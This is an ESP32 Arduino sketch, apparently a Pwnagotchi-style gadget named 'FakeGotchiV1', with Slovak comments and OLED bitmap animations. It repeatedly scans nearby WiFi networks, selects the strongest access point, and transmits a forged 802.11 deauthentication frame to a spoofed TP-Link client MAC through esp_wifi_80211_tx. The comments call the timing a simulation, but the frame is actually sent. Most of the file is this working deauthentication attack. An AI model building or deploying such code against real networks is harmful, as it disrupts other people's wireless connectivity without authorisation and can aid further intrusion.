// comming soon
// IN THIS v1 code will be all necessary stuff as basic and simple to use
// headless mode ON
#include <Adafruit_GFX.h>
#include <Wire.h>
#include <WiFi.h>
#include <Adafruit_SSD1306.h>
#include "bitmaps.h"
#include "esp_wifi.h"

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Dynamic set MAC address of Access Point
uint8_t ap_mac[6];  // Tento buffer will be FILLED with Searched STRONGES Target MAC

// MAC address of client (set as TP-Link Device to fool)
uint8_t client_mac[6] = {0x10, 0xFE, 0xED, 0xC9, 0x2B, 0x17}; // 10:FE:ED This is TP-Link, (REPLACE IT BY YOUR MAC ADDRESS)

void sendDeauthPacket(uint8_t *target_mac, uint8_t *source_mac) {
  uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x3A, 0x01,                   // Frame Control, Duration
      target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // Target MAC
      source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5], // Source MAC
      source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5], // BSSID
      0x00, 0x00,                               // Sequence Control
      0x07, 0x00                                // Reason Code: Class 3 frame received from nonassociated STA
  };

  // Odoslanie paketu pomocou nízkoúrovňovej funkcie
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA); 
  WiFi.disconnect();   
  delay(100);          
  Serial.println("Pripravený na skenovanie WiFi sietí...");

  // Inicializácia displeja
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setCursor(0, 30);
  display.print("Status : Display OK !");
  display.display();
  delay(1000);

  // Zobrazí 3x "FakeGotchiV1" bitmapu
  for (int i = 0; i < 3; i++) {
    display.clearDisplay();
    display.drawBitmap(0, 0, FakeGotchiV1, 128, 64, WHITE);  // Zobraziť obrázok FakeGotchiV1
    display.display();
    delay(800);
    display.clearDisplay();
  }
}

void loop() {
  WiFiScan();  // Spustí skenovanie WiFi sietí

  // Čaká 10 sekúnd pred opakovaním skenovania
  delay(10000);
}

void WiFiScan() {
  Serial.println("\nSkenovanie WiFi sietí...");
  display.clearDisplay();
  display.drawBitmap(0, 0, KittyHAPPY, 128, 64, WHITE);  // Zobraziť obrázok KittyHAPPY počas skenovania
  display.display();

  int n = WiFi.scanNetworks();  // Skenuje WiFi siete

  if (n == 0) {
    Serial.println("Žiadne siete neboli nájdené.");
  } else {
    Serial.printf("Nájdených sietí: %d\n", n);
    
    int strongestRSSI = -100;  // Predpokladaná najnižšia hodnoty RSSI
    String strongestSSID = "";
    String strongestBSSID = "";

    for (int i = 0; i < n; i++) {
      // Konvertovanie MAC adresy na čitateľný formát
      String bssidStr = "";
      const uint8_t *bssid = WiFi.BSSID(i);
      for (int j = 0; j < 6; j++) {
        if (j > 0) bssidStr += ":";
        bssidStr += String(bssid[j], HEX);
      }

      // Zistenie, či je sieť skrytá
      String hiddenStatus = WiFi.SSID(i).isEmpty() ? "Áno" : "Nie";

      // Vypíše SSID, MAC, RSSI a informáciu o skrytí siete
      Serial.printf("%d: SSID: %s, MAC: %s, RSSI: %d dBm, Skrytá: %s\n", 
                    i + 1, 
                    WiFi.SSID(i).c_str(), 
                    bssidStr.c_str(), 
                    WiFi.RSSI(i), 
                    hiddenStatus.c_str());
      
      // Hľadanie najlepšej siete podľa RSSI
      if (WiFi.RSSI(i) > strongestRSSI) {
        strongestRSSI = WiFi.RSSI(i);
        strongestSSID = WiFi.SSID(i);
        strongestBSSID = bssidStr;
        
        // Uloženie MAC adresy najsilnejšej siete
        memcpy(ap_mac, bssid, 6);  // Uložíme MAC adresu najsilnejšej siete do ap_mac
      }
    }

    // Vytlačí informácie o najlepšej sieti
    Serial.println("\nNajsilnejšia WiFi sieť:");
    Serial.printf("SSID: %s, MAC: %s, RSSI: %d dBm\n", strongestSSID.c_str(), strongestBSSID.c_str(), strongestRSSI);

    // Simulácia odosielania Deauth paketov na cieľovú MAC
    Serial.println("Odosielanie Deauth paketov...");
    sendDeauthPacket(client_mac, ap_mac); // Odoslanie paketu na klienta
    delay(5000); // Simulácia trvania Deauth útoku počas 5 sekúnd
  }

  // Vyčistí OLED displej po skenovaní a Deauth paketoach
  display.clearDisplay();
  display.display();
}
